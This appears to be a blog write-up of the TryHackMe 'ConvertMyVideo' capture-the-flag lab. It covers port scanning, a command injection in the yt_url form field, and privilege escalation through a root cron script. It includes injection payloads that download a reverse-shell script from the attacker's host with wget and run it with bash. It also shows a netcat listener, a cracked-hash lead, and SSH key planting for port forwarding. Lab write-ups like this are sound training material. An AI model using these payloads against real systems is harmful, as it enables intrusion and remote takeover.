---
layout: post
title:  "[THM] Convertmyvideo"
date:   2021-05-27 2:18:00 +0200
last_modified_at: 2021-05-14 07:21:29 +0200
toc:  true
tags: [ctf, linux, Tryhackme, Writeup, cron, ssh, command_injection, bonus]
categories: Tryhackme
---

It is a linux machine that allows us to exploit a vulnerability found in the OWASP Top 10 (2017).

---

## Enumeration
### Nmap
*Ports:*
* 22/tcp --> OpenSSH 7.6p1
* 80/tcp --> Apache httpd 2.4.29


```bash
nmap -p- --min-rate 5000 10.10.145.178 -oG Allport             
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-16 20:01 EDT
Stats: 0:01:04 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 22.33% done; ETC: 20:06 (0:03:46 remaining)
Stats: 0:01:07 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 23.09% done; ETC: 20:06 (0:03:43 remaining)
Stats: 0:01:39 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 32.92% done; ETC: 20:06 (0:03:24 remaining)
Warning: 10.10.145.178 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.145.178
Host is up (0.036s latency).
Not shown: 41212 filtered ports, 24321 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 266.37 seconds
```
*More exhaustive scanning:*
```sql 
nmap -sC -sV -Pn -p22,80 10.10.145.178 -oN Scan_Port     
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-16 20:09 EDT
Nmap scan report for 10.10.145.178
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 65:1b:fc:74:10:39:df:dd:d0:2d:f0:53:1c:eb:6d:ec (RSA)
|   256 c4:28:04:a5:c3:b9:6a:95:5a:4d:7a:6e:46:e2:14:db (ECDSA)
|_  256 ba:07:bb:cd:42:4a:f2:93:d1:05:d0:b3:4c:b1:d9:b1 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.92 seconds
```


### Fuzzer

After fuzzing I came across a directory which is admin:

![](/images_blog/img_convertmyvideo/Pastedimage20210416201737.png)
![Pastedimage20210416201737](https://user-images.githubusercontent.com/76759292/127757710-64e265d5-b99f-4397-9f32-b29238611ffc.png)


## PoC Command Injection

After a while of testing I found a command injection in the part where the url is inserted

```bash
POST / HTTP/1.1
Host: 10.10.43.37
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 42
Origin: http://10.10.43.37
Connection: close
Referer: http://10.10.43.37/


yt_url=|whoami;
```

![](/images_blog/img_convertmyvideo/Pastedimage20210416210230.png)
![Pastedimage20210416210230](https://user-images.githubusercontent.com/76759292/127757723-4dc3ddf8-2de9-4564-bee5-97ab61d011b3.png)


We can also visualize the flag from here (For the spacing I use Input Field Separators which is an input field separator variable):  
  

![](/images_blog/img_convertmyvideo/Pastedimage20210416211813.png)
![Pastedimage20210416211813](https://user-images.githubusercontent.com/76759292/127757727-fc4e3dd1-fd78-45e3-b4d8-106c00b23e09.png)

We can visualize the content that admin has:
![](/images_blog/img_convertmyvideo/Pastedimage20210416211957.png)
![Pastedimage20210416211957](https://user-images.githubusercontent.com/76759292/127757731-3a285cca-4e6f-474d-89e3-6e62d08a27d2.png)

Something that is striking is the content that has .htpasswd

![](/images_blog/img_convertmyvideo/Pastedimage20210416212308.png)
![Pastedimage20210416212308](https://user-images.githubusercontent.com/76759292/127757745-e60616cb-5985-48c0-b63c-f9c6d51b228a.png)


```
"output":"itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y\/\n"
```

With this we will be able to crack ```jesie``` and later to enter in the panel that appears when we enter to /admin. This time we will go for another vector.

## Shell Initial

First we will do a simple reverse with bash and then we will set up a server with python:

```bash
POST / HTTP/1.1

Host: 10.10.43.37
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 42
Origin: http://10.10.43.37
Connection: close
Referer: http://10.10.43.37/

yt_url=|wget${IFS}10.9.206.201:8000/rev.sh;
```

Then we run the reverse:

```
POST / HTTP/1.1
Host: 10.10.145.178
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 25
Origin: http://10.10.145.178
Connection: close
Referer: http://10.10.145.178/

yt_url=|bash${IFS}rev.sh;
```


![](/images_blog/img_convertmyvideo/Pastedimage20210416213538.png)
![Pastedimage20210416213538](https://user-images.githubusercontent.com/76759292/127757751-7f9e8d86-b68b-47a8-8ddd-3a204c9e9554.png)


```sql
rlwrap nc -lvnp 443                                  
listening on [any] 443 ...
connect to [10.9.206.201] from (UNKNOWN) [10.10.145.178] 42824
bash: cannot set terminal process group (879): Inappropriate ioctl for device
bash: no job control in this shell
www-data@dmv:/var/www/html$ 
```

## PrivEsc

The first utility to use is ```linpeas``` this shows us the same thing we got out with the command injection:

```
Reading /var/www/html/admin/.htpasswd                                        
itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/
```


An interesting script is clean.sh, the idea is basically to add a reverse and wait for it to be executed:

![](/images_blog/img_convertmyvideo/Pastedimage20210521174646.png)
![Pastedimage20210521174646](https://user-images.githubusercontent.com/76759292/127757755-383cfbca-aa66-43e0-a23b-57a135cc6f93.png)


This image confirms my theory that this script is basically executed by root through a cron job:

![](/images_blog/img_convertmyvideo/Pastedimage20210521174719.png)
![Pastedimage20210521174719](https://user-images.githubusercontent.com/76759292/127757762-889d4ecd-dce2-4c25-82d0-63334389a4ac.png)


```bash
cat root.txt
flag{d9b368018e912b541a4eb68399c5e94a}
root@dmv:~# 
```

MACHINE PWNED!!!!!

## Extra 

This does not go with the resolution of the machine but I find interesting the issue of local port forwarding that allows us to visualize services that can only be seen in the machine locally (This is not the case but assuming that we find ourselves later with this).

First we generate a pair of keys with ssh-keygen:
![](/images_blog/img_convertmyvideo/Pastedimage20210521180334.png)
![Pastedimage20210521180334](https://user-images.githubusercontent.com/76759292/127757767-6490e00f-bc47-4c89-a208-7a4badd90d52.png)


We add our key to the authorized_keys:
![](/images_blog/img_convertmyvideo/Pastedimage20210521180445.png)
![Pastedimage20210521180445](https://user-images.githubusercontent.com/76759292/127757768-6ceedccb-bf53-4e71-bcb9-77b6513f795c.png)


We test that everything is correct:
![](/images_blog/img_convertmyvideo/Pastedimage20210521180621.png)
![Pastedimage20210521180621](https://user-images.githubusercontent.com/76759292/127757769-49ef382b-cbd0-403f-b77b-e34d1beb161c.png)


With the following command we are telling it that we want port 80 of the victim machine to be mirrored on port 8084 of our machine:
![](/images_blog/img_convertmyvideo/Pastedimage20210521181139.png)
![Pastedimage20210521181139](https://user-images.githubusercontent.com/76759292/127757771-a48a1471-51f3-4c4c-88bc-9d0e4e66cfbc.png)


This is how we could visualize it:
![](/images_blog/img_convertmyvideo/Pastedimage20210521181155.png)
![Pastedimage20210521181155](https://user-images.githubusercontent.com/76759292/127757779-2cb3c5c9-5c6f-4230-95ee-3e66f5b4249d.png)


On this machine we were able to exploit a command injection and subsequently abuse a cron job.

<p align="center">
<img src="https://tenor.com/view/typing-petty-fast-cloudy-with-a-chance-of-meatballs-flint-lockwood-gif-4907824.gif" width="300" height="300" />
</p>
